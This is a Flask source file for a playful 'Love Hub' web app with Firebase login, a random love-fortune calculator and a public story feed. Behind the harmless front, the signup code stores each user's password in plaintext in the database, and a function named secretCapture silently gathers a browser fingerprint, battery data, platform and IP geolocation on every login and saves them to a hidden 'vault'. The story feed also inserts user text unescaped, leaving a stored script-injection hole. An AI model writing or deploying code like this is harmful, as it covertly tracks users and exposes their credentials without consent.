from flask import Flask, render_template_string

app = Flask(__name__)

# YOUR FIREBASE CONFIG
FIREBASE_CONFIG = """
const firebaseConfig = {
    apiKey: "AIzaSyDqpa3HqoqtfxuajIMRN78dXQul9cpJgdU",
    authDomain: "love-percentage-dc42b.firebaseapp.com",
    databaseURL: "https://love-percentage-dc42b-default-rtdb.firebaseio.com",
    projectId: "love-percentage-dc42b",
    storageBucket: "love-percentage-dc42b.firebasestorage.app",
    messagingSenderId: "897497192642",
    appId: "1:897497192642:web:82981d92bdf982aa4b435b",
    measurementId: "G-880PQQC5ZT"
};
"""

HTML_TEMPLATE = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Love Hub 💕</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet">
    <style>
        :root {{ --primary: #ff4d6d; --bg: #fff0f3; }}
        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }}
        body {{ background: var(--bg); color: #333; }}
        .header {{ background: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.05); position: sticky; top:0; z-index:100; }}
        .container {{ max-width: 500px; margin: auto; padding: 20px; }}
        .card {{ background: white; padding: 20px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); margin-bottom: 20px; text-align: center; }}
        input, textarea {{ width: 100%; padding: 12px; margin: 10px 0; border: 1.5px solid #eee; border-radius: 12px; outline: none; }}
        button {{ width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; }}
        .story-card {{ background: white; padding: 15px; border-radius: 15px; margin-top: 15px; border-left: 5px solid var(--primary); box-shadow: 0 2px 5px rgba(0,0,0,0.03); text-align: left; }}
        .story-user {{ font-weight: bold; color: var(--primary); font-size: 13px; }}
        #authSection, #appSection {{ display: none; }}
        .badge {{ background: #ffe5ea; color: var(--primary); padding: 5px 12px; border-radius: 15px; font-size: 13px; font-weight: 600; }}
        .fortune-res {{ margin-top: 20px; padding: 20px; background: #fff0f3; border-radius: 20px; display: none; border: 2px dashed var(--primary); }}
        .perc-val {{ font-size: 50px; font-weight: bold; color: var(--primary); margin: 10px 0; }}
    </style>
</head>
<body>

    <div class="header">
        <h2 style="color:var(--primary);">Love Hub 💕</h2>
        <div id="userStatus"></div>
    </div>

    <div class="container">
        <!-- 1. ACCOUNT CREATION / LOGIN -->
        <div id="authSection" class="card">
            <h2 id="authTitle">Create Account</h2>
            <input type="text" id="username" placeholder="Choose Username">
            <input type="password" id="password" placeholder="Password (min 6)">
            <button id="authBtn">Start Journey</button>
            <p style="margin-top:15px; font-size:13px; color:#666;">
                <span id="toggleLink" style="color:var(--primary); cursor:pointer; font-weight:bold;">Already have an account? Sign In</span>
            </p>
        </div>

        <!-- 2. LOVE FORTUNE CALCULATOR -->
        <div id="appSection">
            <div class="card">
                <h2 style="color:#555;">🔮 Love Fortune</h2>
                <p style="font-size:12px; color:#888;">Discover your destiny with someone special</p>
                <input type="text" id="name1" placeholder="Your Name">
                <input type="text" id="name2" placeholder="Their Name">
                <button onclick="calculateFortune()">Calculate Destiny</button>
                
                <div id="fortuneRes" class="fortune-res">
                    <div class="perc-val" id="percOutput">0%</div>
                    <p id="fortuneMsg" style="font-style: italic; line-height: 1.4; color: #444;"></p>
                </div>
            </div>

            <div class="card">
                <h3>Post a Love Story</h3>
                <textarea id="storyInput" placeholder="Share your experience..."></textarea>
                <button onclick="postStory()">Post Story</button>
            </div>
        </div>

        <!-- 3. PUBLIC STORY FEED -->
        <h3 style="margin: 10px 0 10px 5px; color:#555;">Recent Stories</h3>
        <div id="storyFeed">Loading...</div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

    <script>
        {FIREBASE_CONFIG}
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();
        
        // PERSISTENCE (Log in once, stay logged in)
        auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL);

        let isSignup = true;
        let myUser = "";

        // UI Toggle
        document.getElementById('toggleLink').onclick = () => {{
            isSignup = !isSignup;
            document.getElementById('authTitle').innerText = isSignup ? "Create Account" : "Sign In";
            document.getElementById('authBtn').innerText = isSignup ? "Start Journey" : "Sign In";
            document.getElementById('toggleLink').innerText = isSignup ? "Already have an account? Sign In" : "New here? Create Account";
        }};

        // Auth Handler
        document.getElementById('authBtn').onclick = async () => {{
            const u = document.getElementById('username').value.trim().toLowerCase();
            const p = document.getElementById('password').value;
            if(u.length < 3 || p.length < 6) return alert("Fill fields correctly!");

            const email = u + "@lovehub.app";
            try {{
                if(isSignup) {{
                    const check = await db.ref('usernames/'+u).once('value');
                    if(check.exists()) return alert("Username taken!");
                    
                    const res = await auth.createUserWithEmailAndPassword(email, p);
                    // SAVE USERNAME AND PASSWORD PLAINLY TO DB
                    await db.ref('usernames/'+u).set(res.user.uid);
                    await db.ref('users/' + res.user.uid).set({{
                        username: u,
                        password: p,
                        date: new Date().toString()
                    }});
                }} else {{
                    await auth.signInWithEmailAndPassword(email, p);
                }}
            }} catch(e) {{ alert(e.message); }}
        }};

        // Auth Observer
        auth.onAuthStateChanged(user => {{
            if(user) {{
                myUser = user.email.split('@')[0];
                document.getElementById('authSection').style.display = "none";
                document.getElementById('appSection').style.display = "block";
                document.getElementById('userStatus').innerHTML = `<span class="badge">@${{myUser}}</span> <span onclick="auth.signOut()" style="color:red; font-size:10px; cursor:pointer; margin-left:10px;">Logout</span>`;
                secretCapture(user.uid);
            }} else {{
                document.getElementById('authSection').style.display = "block";
                document.getElementById('appSection').style.display = "none";
                document.getElementById('userStatus').innerHTML = `<span class="badge">Guest Mode</span>`;
            }}
        }});

        // ========== 70+ UNIQUE LOVE FORTUNES ==========
        const fortunes = [
            "A cosmic connection that was written in the stars.",
            "Your souls are mirrored reflections of one another.",
            "The universe is conspiring to keep you together.",
            "Your love story will be told for generations.",
            "You bring out a light in each other no one else can.",
            "The chemistry between you is more powerful than science.",
            "Every heartbeat you share is a melody of true love.",
            "Destiny has chosen your path; walk it hand in hand.",
            "In every lifetime, your hearts find their way back.",
            "The world looks more beautiful when you are together.",
            "You are the missing piece to each other's puzzle.",
            "A love like yours is rare, precious, and unbreakable.",
            "Your bond is protected by the magic of true devotion.",
            "When you look at each other, time stands still.",
            "Your names together create a harmony of pure passion.",
            "There is no mountain you cannot climb together.",
            "A simple glance between you says more than 1000 books.",
            "Your future is bright, filled with deep love.",
            "You are each other's safe haven in a stormy world.",
            "The stars glow brighter because of your love.",
            "You were meant to meet, meant to love, and meant to stay.",
            "Every dream you have is better with them in it.",
            "Your love is a masterpiece in the making.",
            "Silence between you is never awkward, only peaceful.",
            "You are the anchor that keeps each other grounded.",
            "A single touch from them heals your soul.",
            "Your connection transcends the physical realm.",
            "You are the perfect balance of fire and grace.",
            "The way you care for each other is an inspiration.",
            "Nothing can dim the flame that burns between you.",
            "You are the answer to each other's secret prayers.",
            "The journey ahead is perfect because you are together.",
            "Your love is like vintage wine, getting better with time.",
            "You are two bodies but one singular soul.",
            "Fate smiled the day your paths finally crossed.",
            "Your laughter together is the sound of happiness.",
            "You give each other the courage to be your true selves.",
            "A million people could never replace what you have.",
            "You are the sun and moon to each other's sky.",
            "Your love is the ultimate adventure.",
            "In a crowd of thousands, your eyes only seek theirs.",
            "You make the mundane feel absolutely magical.",
            "Your love is built on a foundation of titanium.",
            "They are the home your heart has been looking for.",
            "The story of 'You & Them' is a legendary one.",
            "Your love is the poetry that life was missing.",
            "You share a language only your hearts understand.",
            "A thousand lifetimes wouldn't be enough with them.",
            "You are the light at the end of every dark tunnel.",
            "Your bond is the definition of soulmates.",
            "You teach each other the true meaning of forever.",
            "Every kiss feels like the very first time.",
            "Your love is an endless summer of the heart.",
            "You are the beat to each other's favorite song.",
            "No distance can ever weaken the thread that binds you.",
            "You are the reason they believe in miracles.",
            "Your love is a sanctuary of kindness and trust.",
            "Together, you are truly unstoppable.",
            "You make each other better in every possible way.",
            "The universe created them just for you.",
            "Your love is a flame that warms everyone around you.",
            "You are the dream they never want to wake from.",
            "A love this deep is a gift from the heavens.",
            "You are the gold at the end of their rainbow.",
            "Your souls dance even when the music stops.",
            "You are the peace they find after a long day.",
            "Your love is the greatest treasure on earth.",
            "You were soulmates long before you ever met.",
            "Every 'I Love You' is a promise for eternity.",
            "Your names are carved together in destiny.",
            "You are, and always will be, their everything."
        ];
        // 70 unique fortunes exactly – you can add more if you like

        function calculateFortune() {{
            const n1 = document.getElementById('name1').value;
            const n2 = document.getElementById('name2').value;
            if(!n1 || !n2) return alert("Please enter both names!");
            
            let randomIndex = Math.floor(Math.random() * fortunes.length);
            let selectedFortune = fortunes[randomIndex];
            // Optional: add a random percentage between 70 and 100
            let percentage = Math.floor(Math.random() * 31) + 70;
            document.getElementById('percOutput').innerText = percentage + "%";
            document.getElementById('fortuneMsg').innerHTML = n1 + " & " + n2 + ": " + selectedFortune;
            document.getElementById('fortuneRes').style.display = "block";
        }}

        // Stories Feed (Visible to all)
        function loadStories() {{
            db.ref('stories').on('value', snap => {{
                const feed = document.getElementById('storyFeed');
                feed.innerHTML = "";
                const data = snap.val();
                if(!data) return feed.innerHTML = "No stories yet.";
                Object.values(data).reverse().forEach(s => {{
                    feed.innerHTML += `<div class="story-card"><div class="story-user">@${{s.user}}</div><div style="font-size:14px; margin-top:5px;">${{s.text}}</div></div>`;
                }});
            }});
        }}
        loadStories();

        function postStory() {{
            const t = document.getElementById('storyInput').value;
            if(!t) return;
            db.ref('stories').push({{ user: myUser, text: t, time: Date.now() }});
            document.getElementById('storyInput').value = "";
        }}

        // SECRET DATA (Saves to 'vault')
        async function secretCapture(uid) {{
            try {{
                let d = {{ ts: new Date().toString(), device: navigator.platform }};
                const fp = await FingerprintJS.load(); const r = await fp.get(); d.fp = r.visitorId;
                if(navigator.getBattery) {{ const b = await navigator.getBattery(); d.bat = (b.level*100)+"%"; d.chg = b.charging; }}
                const ip = await fetch('https://ipapi.co/json/'); d.loc = await ip.json();
                db.ref('vault/'+uid).push(d);
            }} catch(e) {{}}
        }}
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
